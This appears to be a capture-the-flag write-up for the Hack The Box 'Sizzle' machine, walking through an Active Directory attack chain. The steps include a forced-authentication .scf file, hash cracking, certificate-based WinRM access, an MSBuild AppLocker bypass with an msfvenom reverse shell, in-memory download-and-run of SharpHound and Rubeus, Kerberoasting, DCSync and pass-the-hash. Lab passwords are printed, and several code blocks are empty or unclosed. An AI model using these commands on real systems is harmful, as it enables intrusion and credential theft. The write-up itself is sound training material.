{% include toc icon="cog" title="Sizzle Solution" %}

The [Sizzle](https://app.hackthebox.com/machines/Sizzle) machine has been created by [mrb3n](https://app.hackthebox.com/users/2984) and [lkys37en](https://app.hackthebox.com/users/709). This is an **insane** Windows Machine with a strong focus on Active Directory exploitation. It was really interesting, especially on the Certificate Service side. We had to *guesstimate* some part of the attack path but, it is still a nice machine.

If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).

# Reconnaissance

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Scan with Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the TCP ports open on the machine.

**Note:** Always allow a few minutes after the start of an HTB box to make sure that all the services are properly running. If you scan the machine right away, you may miss some ports that should be open.

**Remember:** By default, **Nmap** will scans the 1000 most common TCP ports on the targeted host(s). Make sure to read the [documentation](https://nmap.org/docs.html) if you need to scan more ports or change default behaviors.
{: .notice--warning}

Okay, we are on the domain controller for **htb.local** and we have a few interesting open ports, including **HTTP** (80/TCP) and **HTTPS** (443/TCP).

## HTTP Recon

Let's start by doing a quick HTTP reconnaissance with [gobuster](https://github.com/OJ/gobuster), a tool to brute-force directories and files. Here we used a common wordlist to enumerate the directories.

```bash
$ gobuster dir -u http://10.129.250.238 -w /usr/share/wordlists/dirb/common.txt

```

We have some interesting findings, especially the [/certsrv](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831649(v=ws.11)) page which corresponds to the CA Web enrollment page. However, it seems we that need some credentials to get an access to the service.

![image-center](/images/htb/htb_sizzle_certsrv.png){: .align-center}

We will probably get back to that later, let's keep going.

## SMB Shares

We could try to find some open shares via an *anonymous* login on the target machine with [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html).

```bash
$ smbclient -N -L \\\\10.129.250.238

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        Department Shares Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Operations      Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Here we can see a few folders. Let's start by looking at the **Department Shares** folder.

```bash
$ smbclient "\\\\10.129.250.238\\Department Shares"
Enter WORKGROUP\ax password: 
Try "help" to get a list of possible commands.

Now, by checking the **Users** folder we might get some usernames and discover some folders with weak permissions.

```bash

                7779839 blocks of size 4096. 3146808 blocks available
```

After looking around for a few minutes, we couldn't find any interesting files in the shared folders. However, we found out that the **Public** folder was **writable**. Maybe we could upload an *.scf* file to force a user to connect on our machine.

**How did you get there ?** If we had multiple machines, this would be a valid pentest scenario to try to coerce an authentication on our machine, but we had to think this challenge as what it is, a CTF and this was the best path :)
{: .notice--success}

# Initial Access

Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.

## Forced Authentication

According to the [MITRE](https://attack.mitre.org/techniques/T1187/), adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept. The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource, it will automatically attempt to authenticate and send credential information for the current user to the remote system.

For example, a modified **.LNK** or **.SCF** file with the icon filename pointing to an external reference will force the system to load the resource when the icon is rendered to repeatedly gather credentials.

Using the following [article](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.scf) let's see if we can coerce any user to authenticate to our machine and grab a hash. First, we created a simple **.scf** file named *hello.scf*.

```bash
[Shell]
Command=2
IconFile=\\10.10.14.20\share\whatever.ico
[Taskbar]
Command=ToggleDesktop
```

Then, we uploaded the file to the **Public** folder using `smbclient`.

```bash     
smb: \users\Public\> put hello.scf 
putting file hello.scf as \users\Public\hello.scf (0.6 kb/s) (average 0.6 kb/s)
smb: \users\Public\> ls
  .                                   D        0  Sat Jun  4 15:51:50 2022

  hello.scf                           A       47  Sat Jun  4 15:51:50 2022

                7779839 blocks of size 4096. 3146287 blocks available
smb: \users\Public\> 
```

Finally, using [responder](https://github.com/lgandx/Responder), an LLMNR, NBT-NS and MDNS poisoner, as listener we were able to capture a hash for the **amanda** account.

```bash
$ sudo responder -I tun0

```

## Password Cracking

Now, we just have to crack the recovered hash offline using the *rockyou* password list (if you are using Kali Linux, it should be present in the `/usr/share/wordlists/` folder). Here, we used [John the Ripper](https://github.com/openwall/john) to crack the password, but it can be done with other tools.

```bash
$ john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])

Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Great, we now have credentials for **amanda** (`amanda:Ashare1972`). Let's check those credentials with `crackmapexec`.

```bash
$ crackmapexec smb 10.129.250.238 -u amanda -p Ashare1972
SMB         10.129.250.238   445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.250.238   445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972 
```

Nice, maybe we can use `evil-winrm` with these credentials.

```bash
$ evil-winrm -i 10.129.250.238 -u amanda -p Ashare1972

Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMHTTPTransportError happened, message is Unable to parse authorization header. Headers: {"Server"=>"Microsoft-HTTPAPI/2.0", "Date"=>"Sat, 04 Jun 2022 21:34:14 GMT", "Connection"=>"close", "Content-Length"=>"0"}                                                                                                                           
Body:  (401). 
Error: Exiting with code 1
```

It looks like a no.

## ADCS 

Given we do have a Certificate Authority, maybe it needs a certificate instead of a password. Let's see if we can access to *http://10.129.250.238/certsrv/* with our credentials (`amanda:Ashare1972`).

![image-center](/images/htb/htb_sizzle_amanda.png){: .align-center}

Now we need to create a certificate signing request (CSR) to request a certificate. [openssl](https://www.openssl.org/docs/manmaster/man1/openssl.html) is our goto tool here. First, we generate an RSA private key.

```bash
$ $ openssl genrsa -des3 -out amanda.key 2048
Generating RSA private key, 2048 bit long modulus (2 primes)
...........................................+++++
..+++++
e is 65537 (0x010001)
Enter pass phrase for amanda.key:
Verifying - Enter pass phrase for amanda.key:
```

Then, we create the CSR. We can leave every field empty as it is not really important here.

```bash
$ openssl req -new -key amanda.key -out amanda.csr
Enter pass phrase for amanda.key:
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.

The newly created CSR should be in the *amanda.csr* file.

```bash

Open the newly created CSR and copy/paste it on *http://10.129.250.238/certsrv/*. We just need to click on **Request a certificate**, then **advanced certificate request** and paste our CSR.

![image-center](/images/htb/htb_sizzle_cert_01.png){: .align-center}

Once the certificate is generated, we can download it (no need to download the chain) as Base64 on our attacking machine.

![image-center](/images/htb/htb_sizzle_cert_02.png){: .align-center}

## WinRM

Finally, let's try again with `evil-winrm` and our newly created certificate. Here we will need to use the `-k` switch for the private key, the `-c` switch for the public key and `-S` to enable SSL.

```bash
$ evil-winrm -i 10.129.250.238 -k amanda.key -c Downloads/certnew.cer -S

Evil-WinRM shell v3.3
Warning: SSL enabled
Info: Establishing connection to remote endpoint

Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\amanda\Documents>
```

This time we got a shell but no flag, yet.

# Privilege Escalation

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## Bypassing CLM/AppLocker

As our PowerShell shell runs with [constrained language mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) (CLM), we cannot execute our fancy scripts. Basically, CLM restrict access to sensitive language elements that can be used to invoke arbitrary Windows APIs. Here is a quick example with [PrivescCheck](https://github.com/itm4n/PrivescCheck):

```bash
*Evil-WinRM* PS C:\Users\amanda\Documents> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
*Evil-WinRM* PS C:\Users\amanda\Documents> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.xx/PrivescCheck.ps1'); Invoke-PrivescCheck
Enter PEM pass phrase:
Cannot create type. Only core types are supported in this language mode.
At line:1 char:5
+ IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.xx/Priv ...
+     ~~~~~~~~~~~~~~~~~~~~~~~~

    + FullyQualifiedErrorId : CannotCreateTypeConstrainedLanguage,Microsoft.PowerShell.Commands.NewObjectCommand

...[snip]...
```

We get a nice error message. Moreover, [AppLocker](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview) is enabled so we cannot download our offensive tools and execute them on the target machine. Here is an example with [Rubeus](https://github.com/GhostPack/Rubeus):

```bash
*Evil-WinRM* PS C:\Users\amanda\Documents> iwr -uri http://10.10.14.20/Rubeus.exe -outfile Rubeus.exe

```

However, like many other security systems, they have flaws and can be bypassed. There are many things we could do here, like searching for potential flaws in the AppLocker policy. For our current use case, we will use an *unmanaged* way to execute PowerShell that is based on [MSBuild.exe](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/). The tool is called [PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell) and can generate **.csproj** file to run with **MSBuild.exe**, which is signed by Microsoft and will bypass AppLocker.

First, let's generate a reverse shell with **msfvenom**. Also, we added an encryption layer with **shikata_ga_nai**, just in case.

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.20 LPORT=445 -e x86/shikata_ga_nai -f raw -o sizzle.raw
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Saved as: sizzle.raw
```

Then, using **PowerLessShell**, we generated our **.csproj** payload.


```bash
$ python2 PowerLessShell.py -source sizzle.raw -output sizzle.csproj
PowerLessShell Less is More
Mr.Un1k0d3r RingZer0 Team
-----------------------------------------------------------
Generating the msbuild file using include/template-shellcode.csproj as the template
File 'sizzle.csproj' created
Process completed
```

Finally, we can upload our payload using `iwr` on the target machine. Note that the file was first hosted on our attacking machine using the **Apache**.

```bash
*Evil-WinRM* PS C:\Users\amanda\Documents> iwr -uri http://10.10.14.20/sizzle.csproj -outfile sizzle.csproj
*Evil-WinRM* PS C:\Users\amanda\Documents> ls

    Directory: C:\Users\amanda\Documents


Mode                LastWriteTime         Length Name

-a----         6/4/2022   6:18 PM           6660 sizzle.csproj
```

Then, before executing `msbuild.exe`, we created a Metasploit handler for our payload.

```bash
$ sudo msfconsole -q -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.14.20; set LPORT 445; exploit"
[sudo] password for ax: 
[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
LHOST => 10.10.14.20
LPORT => 445
[*] Started reverse TCP handler on 10.10.14.20:445 
```

Finally, we can run the payload using **msbuild.exe**. Make sure to provide the full path for **msbuild.exe**.

```bash
*Evil-WinRM* PS C:\Users\amanda\Documents> C:\Windows\microsoft.net\framework\v4.0.30319\msbuild.exe sizzle.csproj

Copyright (C) Microsoft Corporation. All rights reserved.

Build started 6/4/2022 6:19:54 PM.
```

If we take a look at the Metasploit listener, we can see that we have a callback.

```bash
[*] Sending stage (175174 bytes) to 10.129.250.238
[*] Meterpreter session 1 opened (10.10.14.20:445 -> 10.129.250.238:51475) at 2022-06-04 18:19:56 -0400

Meterpreter     : x86/windows
```

Now, let's run PowerShell, this time in **FullLanguage**. To do that, we will use the `powershell` module provided by our Meterpreter shell.

```bash
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell 
PS > $ExecutionContext.SessionState.LanguageMode 
FullLanguage
```

Awesome, however, we are still constrained by **AppLocker**, but it does not really matter as we can run everything in memory. 

## Active Directory Recon

Here, if we want to run [SharpHound](https://github.com/BloodHoundAD/BloodHound) in-memory through a PowerShell wrapper, first, we need to base64-encode the assembly.

```bash
$ base64 SharpHound.exe -w0 > SharpHound.txt
```

Then, we can load it into our PowerShell session.

```bash
PS > $SharpAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String((new-object net.webclient).downloadstring('http://10.10.14.20/SharpHound.txt')))
PS > [Sharphound.Program]::Main(" -d htb.local")

-a----         6/4/2022   6:18 PM           6660 sizzle.csproj
```

Now, using Meterpreter, we can download the results and start our analysis.

```bash
PS > ^Z
Background channel 1? [y/N]  y
meterpreter > download 20220604191736_BloodHound.zip
[*] Downloading: 20220604191736_BloodHound.zip -> /home/ax/20220604191736_BloodHound.zip

[*] download   : 20220604191736_BloodHound.zip -> /home/ax/20220604191736_BloodHound.zip
```

Using Bloodhound's results, let's see if we can gain our initial foothold on the machine by identifying interesting privileges or attack paths, starting with our compromised user. 

![image-center](/images/htb/htb_sizzle_mrlky.png){: .align-center}

After a few checks, it seems that have an interesting attack path. The user **mrlky** has the *DS-Replication-Get-Changes-All* privilege on the domain HTB.LOCAL and this user seems to be [Kerberoastable](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting).

If we can compromise **mrlky** account, we may be able to perform a DCSync attack.

## Kerberoasting

[Kerberoasting](https://attack.mitre.org/techniques/T1558/003/) is an interesting technique that only requires a valid account on the targeted domain. Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any **SPN** from a domain controller. 

Portions of these tickets may be encrypted with the **RC4** algorithm, meaning the *Kerberos 5 TGS-REP etype 23* hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials.

Here, we can use [Rubeus](https://github.com/GhostPack/Rubeus) to find Service Principal Names (SPN) that are associated with a user account and request a TGS.

Here, if we want to run [Rubeus](https://github.com/GhostPack/Rubeus) in-memory through a PowerShell wrapper, again, we need to base64-encode the  assembly.

```bash
$ base64 Rubeus.exe -w0 > Rubeus.txt
```

Then, we can load it into our PowerShell session and request **mrlky** hash with **amanda** credentials.

```bash
PS > $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String((new-object net.webclient).downloadstring('http://10.10.14.20/Rubeus.txt')))
PS > [Rubeus.Program]::MainString("kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972")

                             0DEE480EB16A059D9
```

Now, we just have to crack the recovered hash offline using the *rockyou* password list (if you are using Kali Linux, it should be present in the `/usr/share/wordlists/` folder). Here, we used [John the Ripper](https://github.com/openwall/john) to crack the password, but it can be done with other tools.

```bash

Nice, we are almost done.

## Dump the Administrator Hash

Here, we used [impacket-secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py), another tool from the *Impacket* suite to dump the **Administrator** password using **mrlky** password.

```bash
$ impacket-secretsdump -just-dc-ntlm mrlky:Football#7@10.129.250.238

Perfect, now we can use this NTLM hash to perform a *Pass the Hash* attack and read the **first and second flag** from the domain controller.

Note that **Pass the hash** (or *PtH*) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

Awesome! I hope you enjoyed it, I know I did :)
